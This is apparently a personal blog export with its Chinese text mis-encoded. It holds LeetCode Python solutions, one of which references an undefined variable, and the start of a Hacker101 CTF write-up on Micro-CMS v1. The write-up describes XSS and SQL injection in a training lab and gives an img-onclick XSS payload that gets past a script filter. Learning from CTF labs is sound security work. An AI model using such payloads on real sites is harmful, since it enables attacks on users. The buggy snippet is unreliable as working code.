    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="ç®—æ³•ç¯‡"><a href="#ç®—æ³•ç¯‡" class="headerlink" title="ç®—æ³•ç¯‡"></a>ç®—æ³•ç¯‡</h1><h2 id="ä¸¤æ•°ä¹‹å’Œ"><a href="#ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="ä¸¤æ•°ä¹‹å’Œ"></a>ä¸¤æ•°ä¹‹å’Œ</h2><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ <code>nums</code> å’Œä¸€ä¸ªç›®æ ‡å€¼ <code>target</code>ï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œä½ ä¸èƒ½é‡å¤åˆ©ç”¨è¿™ä¸ªæ•°ç»„ä¸­åŒæ ·çš„å…ƒç´ ã€‚</p>
<p>ç»™å®š nums = [2, 7, 11, 15], target = 9<br>å› ä¸º nums[0] + nums[1] = 2 + 7 = 9<br>æ‰€ä»¥è¿”å› [0, 1]</p>
<h3 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>ç”¨æ—¶20ms</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç”¨len()æ–¹æ³•å–å¾—numsåˆ—è¡¨çš„é•¿åº¦</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># aå–å€¼ä»0ä¸€ç›´åˆ°nï¼ˆä¸åŒ…æ‹¬nï¼‰</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(n):</span><br><span class="line">        </span><br><span class="line">            <span class="comment"># bå–å€¼ä»a+1ä¸€ç›´åˆ°nï¼ˆä¸åŒ…æ‹¬nï¼‰</span></span><br><span class="line">            <span class="comment"># ç”¨a+1æ˜¯å‡å°‘ä¸å¿…è¦çš„å¾ªç¯, bçš„å–å€¼è‚¯å®šæ˜¯æ¯”aå¤§</span></span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> range(a+<span class="number">1</span>, n):</span><br><span class="line">            </span><br><span class="line">                <span class="comment"># å‡å¦‚ target-nums[a] çš„æŸä¸ªå€¼å­˜åœ¨äºnumsä¸­</span></span><br><span class="line">                <span class="comment"># è¿”å› a b</span></span><br><span class="line">                <span class="keyword">if</span> nums[b] == target - nums[a]:</span><br><span class="line">                    <span class="keyword">return</span> a, b</span><br><span class="line">                    <span class="keyword">break</span>       </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>

<p>ç”¨ä¸€ä¸ªåµŒå¥—å¾ªç¯æŠŠnumsåˆ—è¡¨éå†ä¸¤æ¬¡ï¼Œä½†æ˜¯æ—¶é—´å¤æ‚åº¦æ˜¯O(n&sup2;)ï¼Œå¯ä»¥å»è€ƒè™‘ä¸‹å…¶ä»–æ—¶é—´å¤æ‚åº¦ä½çš„æ–¹æ³•</p>
<hr>
<h3 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>ç”¨æ—¶12ms</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self,nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># ç”¨len()æ–¹æ³•å–å¾—numsåˆ—è¡¨é•¿åº¦</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        <span class="comment"># aä»0åˆ°nå–å€¼ï¼ˆä¸åŒ…æ‹¬nï¼‰</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(n):</span><br><span class="line">            i = target - nums[a]</span><br><span class="line">            <span class="comment"># ç”¨inå…³é”®å­—æŸ¥è¯¢numsåˆ—è¡¨ä¸­æ˜¯å¦æœ‰i</span></span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> nums:</span><br><span class="line">                <span class="comment"># ç”¨indexå‡½æ•°å–å¾—içš„å€¼åœ¨numsåˆ—è¡¨ä¸­çš„ç´¢å¼•</span></span><br><span class="line">                b = nums.index(i)</span><br><span class="line">                <span class="comment"># å‡å¦‚a=b, é‚£ä¹ˆå°±è·³è¿‡, å¦åˆ™è¿”å›a,b</span></span><br><span class="line">                <span class="keyword">if</span> a == b:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> a, b</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>
<p>ç”¨ä¸€ä¸ªforå¾ªç¯ï¼Œç›´æ¥åœ¨é‡Œé¢æŸ¥è¯¢ <code>target-nums[a]</code> æ˜¯å¦å­˜åœ¨äº <code>nums</code> åˆ—è¡¨ä¸­ï¼Œé€Ÿåº¦æ¯”æ–¹æ³•1å¿«äº†è®¸å¤š</p>
<hr>
<h3 id="æ–¹æ³•3ï¼ˆçœ‹äº†å¤§ä½¬çš„è§£æ³•ï¼Œå­¦ä¹ å­¦ä¹ ï¼‰"><a href="#æ–¹æ³•3ï¼ˆçœ‹äº†å¤§ä½¬çš„è§£æ³•ï¼Œå­¦ä¹ å­¦ä¹ ï¼‰" class="headerlink" title="æ–¹æ³•3ï¼ˆçœ‹äº†å¤§ä½¬çš„è§£æ³•ï¼Œå­¦ä¹ å­¦ä¹ ï¼‰"></a>æ–¹æ³•3ï¼ˆçœ‹äº†å¤§ä½¬çš„è§£æ³•ï¼Œå­¦ä¹ å­¦ä¹ ï¼‰</h3><p>ç”¨æ—¶36ms<br>å…ˆåˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ï¼Œç„¶åä¾æ¬¡æŠŠ <code>target-nums[a]</code> çš„å€¼å­˜å…¥å­—å…¸ï¼Œå­˜å…¥ä¸€ä¸ªå°±è·Ÿ <code>nums[a+1]</code> å»æ¯”è¾ƒï¼Œ å­—å…¸ä¸­çš„keyä¸º <code>target-nums[a]</code>ï¼Œvalueä¸º <code>a</code>ï¼Œä¹Ÿå°±æ˜¯ <code>nums[a]</code> åœ¨numsåˆ—è¡¨ä¸­çš„ç´¢å¼•ä½ç½®ã€‚å½“å­—å…¸dä¸­æœ‰ <code>nums[a+1]</code>æ—¶ï¼Œä¹Ÿå°±æ˜¯ <code>target - nums[b] = nums[a+1]</code>ï¼Œ iè‚¯å®šæ˜¯å°äºa+1çš„(å› ä¸ºiæ˜¯a+1ä¹‹å‰å¾ªç¯è¿‡çš„æ•°å­—)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self,nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># ç”¨len()æ–¹æ³•å–å¾—numsåˆ—è¡¨é•¿åº¦</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(n):</span><br><span class="line">            i = target - nums[a]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å­—å…¸dä¸­å­˜åœ¨nums[a]æ—¶</span></span><br><span class="line">            <span class="keyword">if</span> nums[a] <span class="keyword">in</span> d:</span><br><span class="line">                <span class="keyword">return</span> d[nums[a]], a</span><br><span class="line">                </span><br><span class="line">            <span class="comment"># å¦åˆ™å¾€å­—å…¸å¢åŠ é”®/å€¼å¯¹</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[i] = a</span><br><span class="line">        <span class="comment"># è¾¹å¾€å­—å…¸å¢åŠ é”®/å€¼å¯¹ï¼Œè¾¹ä¸nums[a]è¿›è¡Œå¯¹æ¯”</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="ä¸¤æ•°ç›¸åŠ "><a href="#ä¸¤æ•°ç›¸åŠ " class="headerlink" title="ä¸¤æ•°ç›¸åŠ "></a>ä¸¤æ•°ç›¸åŠ </h2><p>ç»™å‡ºä¸¤ä¸ª <code>éç©º</code> çš„é“¾è¡¨ç”¨æ¥è¡¨ç¤ºä¸¤ä¸ªéè´Ÿçš„æ•´æ•°ã€‚å…¶ä¸­ï¼Œå®ƒä»¬å„è‡ªçš„ä½æ•°æ˜¯æŒ‰ç…§ <code>é€†åº</code> çš„æ–¹å¼å­˜å‚¨çš„ï¼Œå¹¶ä¸”å®ƒä»¬çš„æ¯ä¸ªèŠ‚ç‚¹åªèƒ½å­˜å‚¨ <code>ä¸€ä½</code> æ•°å­—ã€‚</p>
<p>å¦‚æœï¼Œæˆ‘ä»¬å°†è¿™ä¸¤ä¸ªæ•°ç›¸åŠ èµ·æ¥ï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ªæ–°çš„é“¾è¡¨æ¥è¡¨ç¤ºå®ƒä»¬çš„å’Œã€‚</p>
<p>æ‚¨å¯ä»¥å‡è®¾é™¤äº†æ•°å­— <strong>0</strong> ä¹‹å¤–ï¼Œè¿™ä¸¤ä¸ªæ•°éƒ½ä¸ä¼šä»¥ <strong>0</strong> å¼€å¤´ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong><br>è¾“å…¥ï¼š(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>è¾“å‡ºï¼š7 -&gt; 0 -&gt; 8<br>åŸå› ï¼š342 + 465 = 807</p>
<h3 id="æ–¹æ³•1-1"><a href="#æ–¹æ³•1-1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>ç”¨æ—¶ 28 ms</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ä¸€å¼€å§‹ä¸åšl1å’Œl2çš„éç©ºåˆ¤æ–­ï¼Œå› ä¸ºé¢˜ä¸­å·²ç»è¯´æ˜æ˜¯éç©ºé“¾è¡¨</span></span><br><span class="line">        <span class="comment"># è®°å½•æ˜¯å¦éœ€è¦å¢åŠ æ–°èŠ‚ç‚¹ï¼Œæˆ–è€…åœ¨é“¾è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦éœ€è¦åŠ 1ï¼ŒåŒæ—¶è®°å½•ä¸¤ä¸ªé“¾è¡¨åŒçº§èŠ‚ç‚¹çš„å’Œ</span></span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¿™é‡Œçš„æ‰§è¡Œé¡ºåºæ˜¯ res = ListNode(0),pre = res</span></span><br><span class="line">        res = pre = ListNode(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ¤æ–­l1ã€l2ã€caræ˜¯å¦æœ‰å€¼ï¼Œcarryæœ‰å€¼çš„è¯éœ€è¦å¢åŠ èŠ‚ç‚¹ï¼Œæˆ–è€…åœ¨é“¾è¡¨ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åŠ 1</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2 <span class="keyword">or</span> carry:</span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                carry += l1.val</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                carry += l2.val</span><br><span class="line">                l2 = l2.next</span><br><span class="line">                </span><br><span class="line">            <span class="comment"># carry ç°åœ¨æ˜¯åŒçº§èŠ‚ç‚¹çš„å’Œ</span></span><br><span class="line">            <span class="comment"># divmod è¿”å›å•†ä¸ä½™æ•°çš„å…ƒç»„ï¼Œåˆ†ä¸ºcarå’Œval</span></span><br><span class="line">            <span class="comment"># carry ä¸æ˜¯0çš„è¯ï¼Œéœ€è¦æ–°å»ºèŠ‚ç‚¹æˆ–è€…åœ¨é“¾è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åŠ 1 ï¼Œåœ¨å¾ªç¯ä¸­ç”¨åˆ°</span></span><br><span class="line">            carry, val = divmod(car, <span class="number">10</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ–°å»ºé“¾è¡¨èŠ‚ç‚¹</span></span><br><span class="line">            <span class="comment"># æ‰§è¡Œé¡ºåºæ˜¯pre.next = ListNode(val)</span></span><br><span class="line">            <span class="comment"># pre = pre.next</span></span><br><span class="line">            pre.next = pre =  ListNode(val)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#resç­‰ä»·äºpre ,res.val = 0ï¼Œæ‰€ä»¥è¿”å›res.next</span></span><br><span class="line">        <span class="keyword">return</span> res.next</span><br></pre></td></tr></table></figure></div>

<p><strong>å¾…ç†è§£çš„åœ°æ–¹</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿™é‡Œçš„æ‰§è¡Œé¡ºåºæ˜¯ res = ListNode(0),pre = res</span></span><br><span class="line">        res = pre = ListNode(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p> æŒ‡é’ˆçš„é—®é¢˜ï¼Œç†è§£èµ·æ¥å°±æ˜¯ <code>res = pre = ListNode(0)</code> çš„è¯ï¼Œä¹Ÿå°±æ˜¯ <code>res</code> å’Œ <code>pre</code> æŒ‡å‘äº†åŒä¸€ä¸ªé“¾è¡¨ï¼Œè€Œåˆ†å¼€å†™çš„è¯ï¼Œ<code>pre</code> æ˜¯æŒ‡å‘äº†å¤åˆ¶çš„å’Œ <code>res</code> ç›¸åŒçš„å¦ä¸€ä¸ªé“¾è¡¨ã€‚</p>
<hr>
<h3 id="å¤§ä½¬çš„è§£æ³•2"><a href="#å¤§ä½¬çš„è§£æ³•2" class="headerlink" title="å¤§ä½¬çš„è§£æ³•2"></a>å¤§ä½¬çš„è§£æ³•2</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># è¿™é‡Œä¸€å¼€å§‹ä¸åšl1ã€l2éç©ºåˆ¤æ–­ï¼Œé¢˜æ„è¡¨æ˜éç©ºé“¾è¡¨</span></span><br><span class="line">        <span class="comment"># è®°å½•æ˜¯å¦éœ€è¦å¢åŠ æ–°èŠ‚ç‚¹ï¼Œæˆ–åœ¨é“¾è¡¨ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦éœ€è¦åŠ 1ï¼ŒåŒæ—¶è®°å½•é“¾è¡¨åŒçº§èŠ‚ç‚¹çš„å’Œ</span></span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        <span class="comment"># è¿™é‡Œçš„æ‰§è¡Œé¡ºåºæ˜¯res = ListNode(0), pre = res</span></span><br><span class="line">        res = pre = ListNode(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># åˆ¤æ–­l1ã€l2ã€carryæ˜¯å¦æœ‰å€¼ï¼Œcarryæœ‰å€¼çš„è¯éœ€è¦å¢åŠ æ–°èŠ‚ç‚¹ï¼Œæˆ–åœ¨é“¾è¡¨ä¸‹ä¸€ä¸ªèŠ‚ç‚¹éœ€è¦åŠ 1</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2 <span class="keyword">or</span> carry:</span><br><span class="line">            <span class="comment"># åˆ¤æ–­l1æ˜¯å¦æœ‰å€¼</span></span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                carry += l1.val</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="comment"># åˆ¤æ–­l2æ˜¯å¦æœ‰å€¼</span></span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                carry += l2.val</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            <span class="comment"># carryæœ‰åŒçº§èŠ‚ç‚¹çš„å’Œ</span></span><br><span class="line">            <span class="comment"># divmodè¿”å›å•†ä¸ä½™æ•°çš„å…ƒç»„ï¼Œæ‹†åŒ…ä¸ºcarryå’Œval</span></span><br><span class="line">            <span class="comment"># carryæœ‰å€¼çš„è¯éœ€è¦å¢åŠ æ–°èŠ‚ç‚¹ï¼Œæˆ–åœ¨é“¾è¡¨ä¸‹ä¸€ä¸ªèŠ‚ç‚¹éœ€è¦åŠ 1,åœ¨å¾ªç¯ä¸­ä¼šç”¨åˆ°</span></span><br><span class="line">            carry, val = divmod(carry, <span class="number">10</span>)</span><br><span class="line">            <span class="comment"># æ–°å»ºé“¾è¡¨èŠ‚ç‚¹</span></span><br><span class="line">            <span class="comment"># è¿™é‡Œæ˜¯n.next = ListNode(val), n = n.next()</span></span><br><span class="line">            pre .next = pre  = ListNode(val)</span><br><span class="line">        <span class="comment"># resç­‰ä»·äºpreï¼Œres.val=0ï¼Œæ‰€ä»¥è¿”å›res.next</span></span><br><span class="line">        <span class="keyword">return</span> res.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># åˆ›å»ºå¯¹è±¡Solution</span></span><br><span class="line">    sol = Solution()</span><br><span class="line">    <span class="comment"># å®šä¹‰l1é“¾è¡¨</span></span><br><span class="line">    l1 = ListNode(<span class="number">2</span>)</span><br><span class="line">    l1.next = l11 = ListNode(<span class="number">4</span>)</span><br><span class="line">    l11.next = l12 = ListNode(<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># å®šä¹‰l2é“¾è¡¨</span></span><br><span class="line">    l2 = ListNode(<span class="number">5</span>)</span><br><span class="line">    l2.next = l21 = ListNode(<span class="number">6</span>)</span><br><span class="line">    l21.next = l22 = ListNode(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># è·å–è¿”å›å€¼çš„é“¾è¡¨</span></span><br><span class="line">    res = sol.addTwoNumbers(l1, l2)</span><br><span class="line">    <span class="comment"># å¾ªç¯éå†å‡ºæ¥</span></span><br><span class="line">    <span class="keyword">while</span> res:</span><br><span class="line">        print(res.val)</span><br><span class="line">        res = res.next</span><br></pre></td></tr></table></figure></div>

<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>è¿˜æœ‰å¾ˆå¤šè¦å­¦è¦çœ‹çš„ä¸œè¥¿ï¼Œæ…¢æ…¢æ¥å§ï¼Œè™½ç„¶æ²¡æœ‰å¤šå°‘æ—¶é—´äº†</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker101 CTF writeup</title>
    <url>/yakko117/2019/07/07/hacker101/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘çš„å®è®­å®åœ¨ä¸é«˜å…´å­¦ï¼Œä½†æ˜¯åˆè¢«é€¼ç€æ¯å¤©èŠ±æ—¶é—´åœ¨ä¸Š<br>å¯¼è‡´è‡ªå·±æ‘¸é±¼å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œæ²¡æ€ä¹ˆè®¤çœŸå»åšé¢˜<br>[é¢˜ç›®é“¾æ¥][<a href="https://ctf.hacker101.com/ctf]" target="_blank" rel="noopener">https://ctf.hacker101.com/ctf]</a><br>PS:(ä¸€å¼€å§‹æ²¡çœ‹åˆ°flagæäº¤é¡µé¢ï¼Œæå¾—å¤šèŠ±äº†äº›æ—¶é—´é‡æ–°å†™é¢˜)</p>
<hr>
<h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p>è¿›å…¥é¢˜ç›®ï¼Œç®€å•ä¸€å¥è¯</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3558uj30pi07uweq.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3558uj30pi07uweq.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°å…³é”®ç‚¹ <code>background.png</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35nsnj30f909dmxm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35nsnj30f909dmxm.jpg" class="lazyload" title="test"></a></p>
<p>è¿›å…¥ <code>background.png</code>ï¼Œ å¾—åˆ°flag</p>
<hr>
<h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h2><p>é¢˜ç›®è¯´æ˜æœ‰4ä¸ªflagï¼Œé‚£å°±æ…¢æ…¢æ¥</p>
<h3 id="flag0"><a href="#flag0" class="headerlink" title="flag0"></a>flag0</h3><p>ç‚¹å¼€é¢˜ç›®ï¼Œå‘ç°é¡µé¢å¯é€šè¿‡ <code>Edit this page</code>ï¼Œ ä¿®æ”¹å†…å®¹<br>ç„¶åå‘ç°ç†Ÿæ‚‰çš„æäº¤æ ï¼ŒçŒœæµ‹å­˜åœ¨ <code>xss æ³¨å…¥</code>ï¼Œå°è¯•åœ¨æ ‡é¢˜æ³¨å…¥ï¼Œå›æ˜¾å¾—åˆ° <code>flag</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35orpj30hy09zdfy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu35orpj30hy09zdfy.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>å‘ç°åœ¨æ— è®ºæ˜¯ç¼–è¾‘æ è¿˜æ˜¯é¡µé¢æ ï¼Œå‘ç°é¡µé¢æ˜¯ä»¥æ•°å­—ä¸ºé¡ºåºæ’åˆ—ï¼Œä¸å¦¨è¯•ä¸€è¯•sqlæ³¨å…¥ï¼Œåœ¨ <code>Edit</code> æ å‘ç°å­˜åœ¨æ³¨å…¥ï¼Œ å°è¯•æ·»åŠ å¼•å·ï¼Œå¾—åˆ° <code>flag</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3772lj30z20jpgmd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3772lj30z20jpgmd.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>æ—¢ç„¶æ ‡é¢˜èƒ½å¤Ÿæ³¨å…¥ï¼Œæˆ‘ä»¬å†è¯•ä¸€ä¸‹åœ¨å†…å®¹æ³¨å…¥ï¼Œå‘ç°wafäº† <code>script</code>é‚£æˆ‘ä»¬å°±æ³¨å…¥<br>é‚£æˆ‘ä»¬å°±æ³¨å…¥ <code>&lt;img src=&#39;test&#39; onclick=&#39;alert(1)&#39;&gt;</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu37dh7j30w8064glt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu37dh7j30w8064glt.jpg" class="lazyload" title="test"></a><br>ä¸€å¼€å§‹ç­‰äº†åŠå¤©ï¼Œä»¥ä¸ºå’ŒåŸæ¥ä¸€æ ·è¦ç‚¹ <code>&lt;-- Go Home</code> æ‰åˆ·æ–°å›æ˜¾<br>åæ¥åœ¨æºç é‡Œçœ‹åˆ°flagäº† ï¼ˆ= =ï¼‰</p>
<hr>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>æˆ‘ä»¬å‘ç°åˆ›å»ºçš„æ–°é¡µé¢ï¼Œç›´æ¥ç¼–å·ä¸º10ï¼Œä¸­é—´çš„3-9å“ªå»äº†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu36qkrj30i90b03yo.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu36qkrj30i90b03yo.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå‘ç° ä¿®æ”¹é¡µé¢ç¼–å·3 å‘ç°æ²¡æœ‰URLï¼Œç»§ç»­å°è¯•ï¼Œé¡µé¢ä¸º6æ—¶ï¼Œå¾—åˆ°flag</p>
<hr>
